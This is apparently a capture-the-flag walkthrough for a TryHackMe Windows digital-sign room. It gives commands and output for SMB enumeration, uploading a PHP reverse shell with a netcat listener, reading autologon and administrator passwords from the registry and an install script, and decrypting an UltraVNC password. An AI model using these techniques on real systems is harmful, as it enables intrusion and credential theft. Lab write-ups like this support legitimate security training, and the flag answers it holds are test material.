# [AllSignsPoint2Pwnage](https://tryhackme.com/room/allsignspoint2pwnage)

## A room that contains a rushed Windows based Digital Sign system. Can you breach it?

# Enumeration

## Deploy the Virtual Machine and Enumerate it.

### How many TCP ports under 1024 are open?

```bash
 nmap -p 1-1023 <TARGET_IP>
```

**Results**

```
PORT    STATE SERVICE
21/tcp  open  ftp
80/tcp  open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
```

**Answer:** `6`

### What is the hidden share where images should be copied to?

_Hidden shares in windows end up with a certain symbol_

```bash
smbclient -L //<TARGET_IP> -N
```

**Results**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
images$         Disk
Installs$       Disk
IPC$            IPC       Remote IPC
Users           Disk
```

**Answer:** `images$`

---

# Foothold

## Gain a foothold on the box using what you found through enumeration.

### What user is signed into the console session?

1. Download the PHP reverse shell from `https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php` and save it as `shell.php`.

2. Connect to the `images$` share anonymously and upload the reverse shell:

```bash
smbclient //<TARGET_IP>/images$ -N
put shell.php
```

3. On your attacker machine, start a Netcat listener to catch the incoming connection:

```bash
nc -lvnp 4444
```

4. Trigger the reverse shell by visiting `http://<TARGET_IP>/` ...

5. Once the shell connects back to your listener, verify the current user:

```bash
whoami
```

<img width="261" height="88" alt="SCREEN01" src="https://github.com/user-attachments/assets/b27f5c4b-ea64-4f62-a8cc-36fec185ced4" />

**Answer:** `sign`

---

### What hidden, non-standard share is only remotely accessible as an administrative account?

```bash
net share
```

**Results:**

```
Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share
images$      C:\xampp\htdocs\images          Caching disabled
Installs$    C:\Installs                     Caching disabled
IPC$                                         Remote IPC
ADMIN$       C:\Windows                      Remote Admin
Users        C:\Users
```

**Answer:** `Installs$`

---

### What is the content of user_flag.txt?

_On the users desktop_

```bash
C:\Users\sign\Desktop
type user_flag.txt
```

<img width="499" height="278" alt="SCREEN02" src="https://github.com/user-attachments/assets/1db4fc2c-0cbf-4e18-b517-739c0c1306ab" />

# Pwnage

## Find the passwords and Admin Flag

### What is the Users Password?

_The user is automatically logged into the computer_

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Results:**

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x18054b5f1
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    EnableFirstLogonAnimation    REG_DWORD    0x1
    AutoLogonSID    REG_SZ    S-1-5-21-201290883-77286733-747258586-1001
    LastUsedUsername    REG_SZ    .\sign
    DefaultUsername    REG_SZ    .\sign
    DefaultPassword    REG_SZ    gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH
    AutoAdminLogon    REG_DWORD    0x1
    ARSOUserConsent    REG_DWORD    0x0
```

**Answer:** `gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH`

---

### What is the Administrators Password?

Navigate to the `Installs$` share content and inspect the install batch script, which was used to set up the digital sign system:

```bash
cd C:\Installs
type Install_www_and_deploy.bat
```

**Results:**

```
@echo off
REM Shop Sign Install Script
cd C:\Installs
psexec -accepteula -nobanner -u administrator -p RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi xampp-windows-x64-7.4.11-0-VC15-installer.exe   --disable-components xampp_mysql,xampp_filezilla,xampp_mercury,xampp_tomcat,xampp_perl,xampp_phpmyadmin,xampp_webalizer,xampp_sendmail --mode unattended --launchapps 1
xcopy C:\Installs\simepleslide\src\* C:\xampp\htdocs\
move C:\xampp\htdocs\index.php C:\xampp\htdocs\index.php_orig
copy C:\Installs\simepleslide\src\slide.html C:\xampp\htdocs\index.html
mkdir C:\xampp\htdocs\images
UltraVNC_1_2_40_X64_Setup.exe /silent
copy ultravnc.ini "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini" /y
copy startup.bat "c:\programdata\Microsoft\Windows\Start Menu\Programs\Startup\"
pause
```

**Answer:** `RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi`

---

### What executable is used to run the installer with the Administrator username and password?

_CaSesensitive.exe_

**Amswer:** `PsExec.exe`

---

### What is the VNC Password?

_There are a few versions but some do not work. The version here is known to work: http://aluigi.altervista.org/pwdrec.htm_

1. The install script copied a `ultravnc.ini` configuration file into the UltraVNC installation directory. Read it to find the stored password hashes:

```bash
type "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini"
```

**Results:**

```
[ultravnc]
passwd=B3A8F2D8BEA2F1FA70
passwd2=00B2CDC0BADCAF1397
[admin]
UseRegistry=0
SendExtraMouse=1
Secure=0
MSLogonRequired=0
NewMSLogon=0
DebugMode=0
Avilog=0
path=C:\Program Files\uvnc bvba\UltraVNC
accept_reject_mesg=
DebugLevel=8
DisableTrayIcon=0
rdpmode=0
noscreensaver=0
LoopbackOnly=0
UseDSMPlugin=0
AllowLoopback=1
AuthRequired=1
ConnectPriority=1
DSMPlugin=
AuthHosts=
DSMPluginConfig=
AllowShutdown=1
AllowProperties=1
AllowInjection=0
AllowEditClients=1
FileTransferEnabled=0
FTUserImpersonation=1
BlankMonitorEnabled=1
BlankInputsOnly=0
DefaultScale=1
primary=1
secondary=0
SocketConnect=1
HTTPConnect=0
AutoPortSelect=1
PortNumber=5900
HTTPPortNumber=5800
IdleTimeout=0
IdleInputTimeout=0
RemoveWallpaper=0
RemoveAero=0
QuerySetting=2
QueryTimeout=10
QueryDisableTime=0
QueryAccept=0
QueryIfNoLogon=1
InputsEnabled=1
LockSetting=0
LocalInputsDisabled=0
EnableJapInput=0
EnableUnicodeInput=0
EnableWin8Helper=0
kickrdp=0
clearconsole=0
service_commandline=
FileTransferTimeout=1
KeepAliveInterval=5
[admin_auth]
group1=
group2=
group3=
locdom1=0
locdom2=0
locdom3=0
[poll]
TurboMode=1
PollUnderCursor=0
PollForeground=0
PollFullScreen=1
OnlyPollConsole=0
OnlyPollOnEvent=0
MaxCpu=40
EnableDriver=0
EnableHook=1
EnableVirtual=0
SingleWindow=0
SingleWindowName=
```

The `passwd` field contains the primary VNC password stored as a hex-encoded DES-CBC ciphertext. UltraVNC uses a fixed, publicly known 8-byte DES key to obfuscate passwords.

2. Decrypt the `passwd` value on your attacker machine. Convert the hex to raw bytes, then decrypt using DES-CBC with the hardcoded key and a zero IV:

```bash
echo -n B3A8F2D8BEA2F1FA70 | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
```

**Answer:** `5upp0rt9`

---

### What is the contents of the admin_flag.txt?

_On the users desktop_

```bash
smbclient //<TARGET_IP>/C$ -U administrator
cd Users\Administrator\Desktop
get admin_flag.txt
```

<img width="1098" height="338" alt="SCREEN03" src="https://github.com/user-attachments/assets/1aae5e7b-8ad5-4c87-9ef5-46d73521904e" />
